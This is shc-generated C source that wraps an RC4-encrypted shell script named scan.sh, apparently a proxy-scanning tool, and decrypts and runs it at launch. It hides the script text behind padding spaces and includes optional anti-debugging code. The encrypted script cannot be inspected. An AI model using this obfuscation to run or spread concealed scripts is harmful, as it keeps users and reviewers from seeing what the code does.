#if 0
	shc Version 3.9.6, Generic Shell Script Compiler
	GNU GPL Version 3 Md Jahidul Hamid <jahidulhamid@yahoo.com>

	shc -f scan.sh -o scanproxy.sh 
#endif

static  char data [] = 
#define      rlax_z	1
#define      rlax	((&data[0]))
	"\324"
#define      chk1_z	22
#define      chk1	((&data[1]))
	"\215\241\255\105\167\226\072\143\220\260\162\157\251\066\070\203"
	"\250\175\003\332\226\340"
#define      shll_z	14
#define      shll	((&data[23]))
	"\060\134\252\343\275\127\065\365\126\020\201\105\237\131"
#define      inlo_z	3
#define      inlo	((&data[37]))
	"\260\131\262"
#define      opts_z	1
#define      opts	((&data[40]))
	"\350"
#define      text_z	2280
#define      text	((&data[260]))
	"\265\032\075\272\222\216\222\154\136\122\117\264\320\010\260\203"
	"\234\327\224\337\372\240\023\120\215\316\333\331\226\076\165\113"
	"\130\262\006\353\100\230\127\237\353\247\124\273\257\005\077\114"
	"\334\323\053\327\163\077\047\001\015\003\332\244\101\117\357\232"
	"\002\366\205\103\216\335\342\171\204\067\065\064\074\164\200\030"
	"\110\254\360\274\353\027\275\371\033\230\235\134\350\215\366\352"
	"\203\173\055\022\130\020\214\335\110\301\021\204\066\221\235\177"
	"\075\215\073\051\245\370\042\300\220\300\035\171\116\023\143\321"
	"\217\221\343\350\241\160\306\351\061\327\156\150\151\013\347\247"
	"\231\042\320\076\033\363\377\254\263\034\045\001\060\211\323\300"
	"\032\267\250\274\047\156\246\131\106\024\302\257\040\251\126\272"
	"\314\047\371\347\032\370\224\316\025\271\320\105\103\243\005\135"
	"\133\256\031\203\035\300\334\144\325\237\023\366\111\152\260\025"
	"\222\251\375\254\242\221\173\267\113\113\375\165\162\243\003\254"
	"\256\315\014\055\154\076\155\000\341\372\022\036\257\376\221\155"
	"\064\314\154\021\076\053\300\013\352\373\310\050\040\321\356\007"
	"\206\300\277\327\353\111\165\356\216\371\236\215\355\222\106\073"
	"\331\134\351\273\051\317\027\124\052\027\155\234\155\335\163\227"
	"\120\302\147\361\324\160\015\264\074\161\377\347\017\027\234\275"
	"\054\372\117\303\340\144\065\061\211\214\136\041\035\171\151\233"
	"\115\341\166\224\370\036\327\040\153\125\065\216\327\273\160\101"
	"\013\273\302\202\247\202\024\352\371\105\037\033\053\044\373\337"
	"\121\266\363\003\151\000\164\305\176\200\134\324\211\334\215\135"
	"\214\357\057\267\366\276\117\043\011\370\050\075\346\241\225\027"
	"\105\366\335\215\241\134\071\317\234\270\354\351\005\163\344\370"
	"\052\260\332\146\160\205\243\203\174\154\346\035\272\055\342\362"
	"\373\330\267\266\221\006\324\332\144\203\153\000\365\142\346\342"
	"\237\256\164\111\234\260\310\057\150\226\067\257\214\271\237\216"
	"\170\141\064\166\357\036\330\035\371\242\066\324\121\211\373\276"
	"\177\006\063\322\267\301\045\256\130\265\346\147\147\304\236\253"
	"\014\234\216\145\066\302\223\341\264\271\343\061\042\175\130\027"
	"\164\234\373\232\277\011\215\312\250\050\100\334\146\130\047\063"
	"\165\052\200\263\306\206\064\133\141\363\333\224\057\104\122\200"
	"\137\364\224\117\143\156\220\076\333\230\027\236\262\320\211\376"
	"\347\046\124\174\355\302\223\367\133\232\254\374\223\123\316\367"
	"\270\140\001\256\372\130\223\257\047\222\076\330\114\014\326\332"
	"\355\046\015\213\233\234\112\135\311\310\367\205\317\237\252\230"
	"\213\051\332\245\123\107\067\351\065\260\204\036\150\321\021\170"
	"\367\122\351\126\020\040\363\160\104\121\070\321\330\215\025\164"
	"\354\335\342\165\272\211\110\036\270\107\011\341\060\165\123\024"
	"\065\102\246\170\255\333\037\261\344\044\271\254\313\373\104\160"
	"\120\344\346\266\221\141\075\072\146\170\143\075\025\115\226\216"
	"\030\342\245\135\136\002\264\361\132\326\340\016\202\034\270\107"
	"\002\327\044\172\130\104\313\251\211\026\230\335\236\354\133\132"
	"\154\350\354\322\334\134\301\363\302\372\304\200\223\320\073\151"
	"\237\037\321\312\162\060\366\176\203\051\234\362\022\161\207\046"
	"\131\143\200\040\156\354\011\120\305\110\303\341\215\170\034\147"
	"\333\046\037\162\157\067\272\045\165\064\272\227\365\274\211\243"
	"\372\334\323\245\170\353\366\270\151\251\114\007\143\033\320\200"
	"\126\120\262\175\102\100\136\335\335\277\051\311\210\137\160\046"
	"\015\271\307\052\315\213\365\004\056\077\300\131\062\047\225\174"
	"\107\064\334\276\362\331\126\062\225\025\141\302\316\141\134\074"
	"\040\203\001\376\030\373\256\235\052\114\047\356\212\203\065\121"
	"\325\062\103\176\026\325\065\067\367\074\030\373\266\303\242\003"
	"\150\365\333\014\213\312\146\021\033\173\361\137\240\316\206\057"
	"\117\341\021\020\204\361\007\223\135\066\031\035\150\075\154\363"
	"\115\336\315\012\116\277\263\116\010\126\003\077\127\346\310\116"
	"\332\305\336\215\122\022\212\016\231\260\106\160\145\330\317\223"
	"\373\364\033\363\225\062\025\137\275\376\100\102\102\341\237\262"
	"\123\033\156\362\043\014\117\343\100\315\027\315\045\251\225\036"
	"\162\240\062\170\116\357\164\235\266\016\353\110\106\003\353\321"
	"\146\233\075\353\223\257\061\300\122\260\014\241\241\226\331\070"
	"\042\340\017\245\242\253\254\164\227\051\132\337\200\361\057\121"
	"\112\006\027\164\165\321\000\343\162\223\052\000\215\370\067\372"
	"\002\244\074\317\370\375\320\231\371\307\256\053\330\021\037\067"
	"\365\005\203\346\025\003\134\375\115\244\236\350\351\337\215\123"
	"\226\326\152\303\267\112\360\074\065\341\211\336\344\064\135\015"
	"\074\030\135\267\025\012\341\221\145\340\015\176\023\056\127\012"
	"\015\074\005\323\367\155\274\323\033\375\264\232\356\030\057\373"
	"\274\075\355\336\054\164\334\173\136\272\035\244\137\214\067\171"
	"\230\005\266\136\112\221\246\074\332\310\333\270\060\224\315\075"
	"\335\321\270\320\316\227\331\235\174\065\377\006\307\264\263\164"
	"\175\323\251\173\046\277\110\107\104\140\015\173\123\115\164\027"
	"\142\307\136\167\205\035\134\105\072\276\105\052\367\233\301\327"
	"\133\336\051\006\035\205\102\046\126\375\170\330\335\135\227\141"
	"\346\274\323\032\151\000\274\071\237\163\242\045\070\072\326\224"
	"\224\124\347\075\352\120\364\207\334\202\353\221\052\336\253\144"
	"\007\107\341\277\167\320\332\334\247\223\374\205\225\051\263\044"
	"\070\036\134\061\232\136\120\357\052\206\305\023\136\350\356\013"
	"\275\314\312\301\126\303\304\130\153\057\013\201\101\245\353\324"
	"\356\047\077\215\060\217\220\012\102\236\245\111\142\165\213\267"
	"\064\262\063\046\312\105\106\033\371\242\054\166\172\374\165\133"
	"\216\042\350\145\036\150\127\117\133\142\151\271\267\375\131\265"
	"\365\225\250\127\332\375\262\265\036\377\304\231\273\001\317\072"
	"\015\304\035\365\063\161\156\112\365\117\137\057\327\342\072\121"
	"\043\161\237\255\333\163\175\307\376\315\156\117\115\030\110\250"
	"\335\026\301\170\203\136\365\276\276\227\376\033\036\163\346\163"
	"\377\300\337\057\252\140\210\362\325\347\132\145\002\075\236\363"
	"\244\212\034\330\204\311\210\314\040\046\101\314\373\247\374\042"
	"\170\303\050\250\360\003\306\156\205\301\202\071\213\046\376\277"
	"\252\057\240\031\106\173\242\147\262\244\223\356\320\350\114\023"
	"\261\360\331\134\367\112\333\276\164\217\266\203\060\311\005\206"
	"\342\357\056\202\117\214\033\325\102\137\301\264\223\345\253\363"
	"\162\016\022\266\352\335\130\301\362\365\003\317\175\345\073\100"
	"\166\127\360\003\226\173\006\263\044\271\261\200\176\253\150\362"
	"\220\256\157\205\244\117\334\016\013\057\154\376\311\331\032\342"
	"\072\376\150\040\101\256\246\207\133\073\073\030\102\204\136\220"
	"\211\060\307\147\241\302\343\173\011\170\320\173\334\143\134\305"
	"\002\376\332\076\251\313\113\066\057\317\311\122\010\331\331\111"
	"\127\222\157\227\137\273\325\104\301\227\326\005\022\030\105\301"
	"\144\172\057\325\344\375\240\332\374\040\327\023\052\212\176\072"
	"\232\225\327\267\217\241\264\323\150\302\367\214\217\303\324\160"
	"\224\311\313\052\006\045\335\107\163\101\203\065\276\103\245\060"
	"\022\236\200\352\175\306\066\211\235\177\364\225\203\072\263\307"
	"\150\122\161\123\302\115\221\313\275\115\050\352\142\013\345\036"
	"\053\145\303\141\312\074\135\322\312\277\276\236\154\011\072\300"
	"\116\057\012\335\117\236\247\114\010\135\025\307\017\234\062\054"
	"\273\176\376\240\137\172\261\175\210\112\034\025\105\031\111\162"
	"\017\025\071\135\364\346\170\216\310\310\122\370\160\306\336\060"
	"\015\124\167\023\242\052\176\165\315\252\036\232\216\337\340\164"
	"\306\112\001\312\305\332\271\332\035\360\163\360\106\003\232\357"
	"\141\164\332\222\376\250\327\026\140\055\146\277\101\143\224\126"
	"\302\374\062\050\230\371\174\363\157\257\337\322\147\043\317\077"
	"\052\173\042\377\153\123\071\003\240\116\056\241\203\170\037\136"
	"\004\112\253\107\007\031\124\313\272\161\076\264\141\251\075\225"
	"\223\211\145\041\122\007\025\074\106\176\040\027\056\151\272\211"
	"\040\247\047\260\026\171\203\200\055\225\244\175\170\361\144\032"
	"\153\360\213\057\301\143\167\074\125\343\362\300\371\376\310\203"
	"\021\076\215\070\144\220\112\003\037\067\226\274\165\011\171\252"
	"\005\313\145\165\106\210\353\367\076\062\215\354\100\355\063\335"
	"\025\341\332\147\220\234\213\165\272\026\210\353\272\324\110\134"
	"\306\156\206\016\371\224\372\103\100\030\200\332\331\147\217\137"
	"\323\017\155\337\055\151\242\357\017\122\034\124\021\361\113\313"
	"\064\352\155\102\315\143\325\075\173\233\155\162\135\135\214\044"
	"\127\141\277\147\165\124\067\216\215\353\246\000\245\322\157\051"
	"\302\075\041\363\133\272\170\257\177\011\332\062\214\272\235\072"
	"\337\063\121\056\245\117\237\364\354\052\025\360\045\246\350\241"
	"\352\146\102\277\052\163\144\224\326\136\373\117\210\316\055\022"
	"\227\067\060\372\303\235\021\320\155\363\246\134\265\156\120\026"
	"\363\262\171\175\276\077\277\075\130\362\156\073\343\047\230\070"
	"\035\335\371\123\307\167\014\375\255\343\120\105\021\160\251\150"
	"\111\300\277\002\270\240\277\076\353\245\006\252\364\327\317\164"
	"\052\355\110\067\204\235\023\103\342\000\365\007\023\261\060\152"
	"\072\020\332\353\340\017\205\273\123\112\177\147\100\103\075\120"
	"\200\367\202\207\211\137\370\303\341\254\362\074\317\204\377\120"
	"\070\220\243\076\205\051\026\362\251\026\120\375\104\251\301\224"
	"\061\322\237\321\075\374\063\142\247\230\040\214\323\121\363\251"
	"\307\265\221\173\217\075\301\104\070\323\076\240\021\370\122\305"
	"\131\173\035\342\015\315\247\364\176\152\324\305\231\177\334\355"
	"\247\211\302\303\344\213\032\366\252\005\313\005\232\105\000\320"
	"\115\324\033\312\371\020\210\035\247\216\316\045\371\253\177\214"
	"\372\157\221\114\021\172\343\005\021\266\220\230\166\370\274\351"
	"\127\072\334\214\057\116\034\047\161\046\004\253\217\300\172\174"
	"\207\051\112\211\275\361\377\146\172\013\314\251\330\210\137\223"
	"\233\210\360\170\127\150\357\067\322\361\126\275\123\220\235\155"
	"\143\302\052\346\112\011\355\202\111\357\055\055\122\371\272\271"
	"\041\237\056\244\241\267\321\021\252\010\270\137\171\105\332\216"
	"\051\162\047\362\253\252\041\140\166\250\202\340\211\162\360\036"
	"\100\027\016\262\136\150\174\005\147\350\134\220\301\223\030\036"
	"\042\146\357\175\070\223\275\026\172\212\175\106\035\077\313\327"
	"\102\046\342\153\165\225\037\334\267\154\205\112\112\043\144\051"
	"\142\250\232\313\160\361\325\135\306\151\317\162\336\215\013\075"
	"\361\047\045\317\333\211\127\271\134\216\203\243\165\065\124\361"
	"\275\250\117\354\265\355\023\112\101\243\130\277\323\246\306\047"
	"\336\144\005\242\254\274\377\065\127\127\376\351\225\013\056\130"
	"\346\350\306\002\165\066\325\106\344\073\204\020\122\075\133\061"
	"\107\046\150\216\357\003\354\113\262\006\316\320\306\253\064\233"
	"\112\110\221\223\263\102\251\105\354\247\362\216\070\156\106\204"
	"\271\104\023\251\110\377\365\372\006\303\312\314\157\377\150\271"
	"\107\372\115\372\075\367\100\051\236\062\270\327\240\377\133\132"
	"\103\157\004\213\157\371\206\165\275\121\102\054\120\253\346\227"
	"\246\064\222\343\053\322\014\311\005\305\240\246\304\374\001\010"
	"\153\006\224\333\000\032\120\275\153\223\352\273\076\321\123\345"
	"\005\345\310\061\270\324\372\276\231\233\144\136\230\146\146\003"
	"\154\372\337\154\024\060\052\200\303\025\074\002\346\217\347\354"
	"\165\260\035\056\204\030\354\036\264\121\175\114\267\343\120\044"
	"\335\057\220\362\137\273\163\043\320\257\046\266\077\016\243\264"
	"\276\301\342\103\332\317\142\216\040\337\333\330\302\053\374\240"
	"\133\214\223\273\107\007\337\027\266\005\316\365\023\162\252\322"
	"\063\215\025\015\134\167\234\175\127\167\125\032\243\121\273\376"
	"\336\116\271\046\126\230\076\014\236\014\002\262\177\255\204\262"
	"\072\231\300\227\021\134\024\150\324\151\202\167\273\075\166\231"
	"\214\060\277\342\311\375\357\147\012\362\031\211\237\236\074\331"
	"\070\374\160\111\131\204\262\056\356\065\245\251\163\034\102\000"
	"\114\002\342\025\377\322\175\011\304\226\223\143\065\317\075\155"
	"\314\256\267\045\063\151\124\041\237\371\313\022\026\015\022\142"
	"\020\365\167\017\307\364\031\213\213\254\357\300\174\054\056\110"
	"\332\345\156\016\117\303\057\356\275\372\000\323\010\023\065"
#define      msg1_z	65
#define      msg1	((&data[2888]))
	"\362\137\227\236\374\015\052\326\331\155\140\244\016\140\002\103"
	"\351\210\237\136\014\135\375\234\262\107\264\154\172\123\337\366"
	"\232\277\125\274\147\255\277\131\331\232\312\076\164\162\113\117"
	"\070\325\137\142\101\123\250\103\205\330\032\033\166\062\177\026"
	"\054\050\317\242\102\133\056\357\113\356\153\167"
#define      date_z	1
#define      date	((&data[2964]))
	"\026"
#define      pswd_z	256
#define      pswd	((&data[2973]))
	"\122\346\220\100\243\213\101\166\276\014\012\375\277\220\222\114"
	"\342\225\021\201\035\074\104\037\016\071\243\355\037\024\144\006"
	"\155\172\371\155\254\141\117\153\155\131\150\054\351\372\171\314"
	"\220\213\116\255\307\222\315\326\314\160\304\354\205\050\363\363"
	"\242\354\140\117\115\257\272\273\011\043\350\363\036\141\277\256"
	"\354\016\134\264\241\051\212\155\232\116\132\037\166\115\022\031"
	"\072\162\150\210\042\042\103\053\106\054\036\144\216\336\022\172"
	"\354\156\056\215\230\271\373\062\007\126\121\175\244\143\226\336"
	"\326\377\147\371\041\253\044\150\327\103\314\145\041\336\340\016"
	"\115\016\234\345\310\230\030\317\356\152\115\223\316\344\161\244"
	"\343\330\235\005\203\302\155\133\005\071\300\047\030\240\065\145"
	"\257\321\113\167\152\144\107\130\316\224\353\234\170\135\101\133"
	"\066\336\140\272\241\315\025\246\007\326\316\037\167\003\205\047"
	"\325\321\237\077\065\346\230\004\173\204\240\363\341\341\117\027"
	"\300\260\322\141\176\347\010\205\276\326\245\065\332\053\134\260"
	"\374\373\357\062\342\210\066\135\014\326\121\355\270\240\005\170"
	"\121\327\332\320\277\342\126\176\223\124\254\254\135\131\324\055"
	"\373\026\211\051\006\324\030\161\114\066\046\237\070\111\000\213"
#define      xecc_z	15
#define      xecc	((&data[3255]))
	"\323\033\312\105\317\031\103\150\172\327\307\370\370\316\373\375"
	"\040\015\111\257"
#define      lsto_z	1
#define      lsto	((&data[3273]))
	"\204"
#define      tst2_z	19
#define      tst2	((&data[3275]))
	"\354\214\001\367\061\164\201\102\156\013\044\113\275\355\036\364"
	"\204\117\327\144"
#define      tst1_z	22
#define      tst1	((&data[3295]))
	"\164\253\143\370\273\224\215\112\025\116\345\115\332\066\140\052"
	"\306\072\131\121\054\263\302\115\112"
#define      msg2_z	19
#define      msg2	((&data[3322]))
	"\303\345\066\151\330\145\063\151\151\071\124\323\051\265\364\153"
	"\114\241\223\364\215\235\374\057"
#define      chk2_z	19
#define      chk2	((&data[3345]))
	"\307\123\363\345\124\266\314\015\206\265\257\242\221\001\377\146"
	"\052\172\336\355\137\062"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */
#define BUSYBOXON	0	/* Define as 1 to enable work with busybox */

/* rtc.c */

#include <sys/stat.h>
#include <sys/types.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

/* 'Alleged RC4' */

static unsigned char stte[256], indx, jndx, kndx;

/*
 * Reset arc4 stte. 
 */
void stte_0(void)
{
	indx = jndx = kndx = 0;
	do {
		stte[indx] = indx;
	} while (++indx);
}

/*
 * Set key. Can be used more than once. 
 */
void key(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		do {
			tmp = stte[indx];
			kndx += tmp;
			kndx += ptr[(int)indx % len];
			stte[indx] = stte[kndx];
			stte[kndx] = tmp;
		} while (++indx);
		ptr += 256;
		len -= 256;
	}
}

/*
 * Crypt data. 
 */
void arc4(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		indx++;
		tmp = stte[indx];
		jndx += tmp;
		stte[indx] = stte[jndx];
		stte[jndx] = tmp;
		tmp += stte[indx];
		*ptr ^= stte[tmp];
		ptr++;
		len--;
	}
}

/* End of ARC4 */

/*
 * Key with file invariants. 
 */
int key_with_file(char * file)
{
	struct stat statf[1];
	struct stat control[1];

	if (stat(file, statf) < 0)
		return -1;

	/* Turn on stable fields */
	memset(control, 0, sizeof(control));
	control->st_ino = statf->st_ino;
	control->st_dev = statf->st_dev;
	control->st_rdev = statf->st_rdev;
	control->st_uid = statf->st_uid;
	control->st_gid = statf->st_gid;
	control->st_size = statf->st_size;
	control->st_mtime = statf->st_mtime;
	control->st_ctime = statf->st_ctime;
	key(control, sizeof(control));
	return 0;
}

#if DEBUGEXEC
void debugexec(char * sh11, int argc, char ** argv)
{
	int i;
	fprintf(stderr, "shll=%s\n", sh11 ? sh11 : "<null>");
	fprintf(stderr, "argc=%d\n", argc);
	if (!argv) {
		fprintf(stderr, "argv=<null>\n");
	} else { 
		for (i = 0; i <= argc ; i++)
			fprintf(stderr, "argv[%d]=%.60s\n", i, argv[i] ? argv[i] : "<null>");
	}
}
#endif /* DEBUGEXEC */

void rmarg(char ** argv, char * arg)
{
	for (; argv && *argv && *argv != arg; argv++);
	for (; argv && *argv; argv++)
		*argv = argv[1];
}

void chkenv_end(void);

int chkenv(int argc)
{
	char buff[512];
	unsigned long mask, m;
	int l, a, c;
	char * string;
	extern char ** environ;

	mask = (unsigned long)getpid();
	stte_0();
	 key(&chkenv, (void*)&chkenv_end - (void*)&chkenv);
	 key(&data, sizeof(data));
	 key(&mask, sizeof(mask));
	arc4(&mask, sizeof(mask));
	sprintf(buff, "x%lx", mask);
	string = getenv(buff);
#if DEBUGEXEC
	fprintf(stderr, "getenv(%s)=%s\n", buff, string ? string : "<null>");
#endif
	l = strlen(buff);
	if (!string) {
		/* 1st */
		sprintf(&buff[l], "=%lu %d", mask, argc);
		putenv(strdup(buff));
		return 0;
	}
	c = sscanf(string, "%lu %d%c", &m, &a, buff);
	if (c == 2 && m == mask) {
		/* 3rd */
		rmarg(environ, &string[-l - 1]);
		return 1 + (argc - a);
	}
	return -1;
}

void chkenv_end(void){}

#if !TRACEABLE

#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>

#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
void untraceable(char * argv0)
{
	char proc[80];
	int pid, mine;

	switch(pid = fork()) {
	case  0:
		pid = getppid();
		/* For problematic SunOS ptrace */
#if defined(__FreeBSD__)
		sprintf(proc, "/proc/%d/mem", (int)pid);
#else
		sprintf(proc, "/proc/%d/as",  (int)pid);
#endif
		close(0);
		mine = !open(proc, O_RDWR|O_EXCL);
		if (!mine && errno != EBUSY)
			mine = !ptrace(PTRACE_ATTACH, pid, 0, 0);
		if (mine) {
			kill(pid, SIGCONT);
		} else {
			perror(argv0);
			kill(pid, SIGKILL);
		}
		_exit(mine);
	case -1:
		break;
	default:
		if (pid == waitpid(pid, 0, 0))
			return;
	}
	perror(argv0);
	_exit(1);
}
#endif /* !TRACEABLE */

char * xsh(int argc, char ** argv)
{
	char * scrpt;
	int ret, i, j;
	char ** varg;
	char * me = argv[0];
	if (me == NULL) { me = getenv("_"); }
	if (me == 0) { fprintf(stderr, "E: neither argv[0] nor $_ works."); exit(1); }

	ret = chkenv(argc);
	stte_0();
	 key(pswd, pswd_z);
	arc4(msg1, msg1_z);
	arc4(date, date_z);
	if (date[0] && (atoll(date)<time(NULL)))
		return msg1;
	arc4(shll, shll_z);
	arc4(inlo, inlo_z);
	arc4(xecc, xecc_z);
	arc4(lsto, lsto_z);
	arc4(tst1, tst1_z);
	 key(tst1, tst1_z);
	arc4(chk1, chk1_z);
	if ((chk1_z != tst1_z) || memcmp(tst1, chk1, tst1_z))
		return tst1;
	arc4(msg2, msg2_z);
	if (ret < 0)
		return msg2;
	varg = (char **)calloc(argc + 10, sizeof(char *));
	if (!varg)
		return 0;
	if (ret) {
		arc4(rlax, rlax_z);
		if (!rlax[0] && key_with_file(shll))
			return shll;
		arc4(opts, opts_z);
		arc4(text, text_z);
		arc4(tst2, tst2_z);
		 key(tst2, tst2_z);
		arc4(chk2, chk2_z);
		if ((chk2_z != tst2_z) || memcmp(tst2, chk2, tst2_z))
			return tst2;
		/* Prepend hide_z spaces to script text to hide it. */
		scrpt = malloc(hide_z + text_z);
		if (!scrpt)
			return 0;
		memset(scrpt, (int) ' ', hide_z);
		memcpy(&scrpt[hide_z], text, text_z);
	} else {			/* Reexecute */
		if (*xecc) {
			scrpt = malloc(512);
			if (!scrpt)
				return 0;
			sprintf(scrpt, xecc, me);
		} else {
			scrpt = me;
		}
	}
	j = 0;
#if BUSYBOXON
	varg[j++] = "busybox";
	varg[j++] = "sh";
#else
	varg[j++] = argv[0];		/* My own name at execution */
#endif
	if (ret && *opts)
		varg[j++] = opts;	/* Options on 1st line of code */
	if (*inlo)
		varg[j++] = inlo;	/* Option introducing inline code */
	varg[j++] = scrpt;		/* The script itself */
	if (*lsto)
		varg[j++] = lsto;	/* Option meaning last option */
	i = (ret > 1) ? ret : 0;	/* Args numbering correction */
	while (i < argc)
		varg[j++] = argv[i++];	/* Main run-time arguments */
	varg[j] = 0;			/* NULL terminated array */
#if DEBUGEXEC
	debugexec(shll, j, varg);
#endif
	execvp(shll, varg);
	return shll;
}

int main(int argc, char ** argv)
{
#if DEBUGEXEC
	debugexec("main", argc, argv);
#endif
#if !TRACEABLE
	untraceable(argv[0]);
#endif
	argv[1] = xsh(argc, argv);
	fprintf(stderr, "%s%s%s: %s\n", argv[0],
		errno ? ": " : "",
		errno ? strerror(errno) : "",
		argv[1] ? argv[1] : "<null>"
	);
	return 1;
}
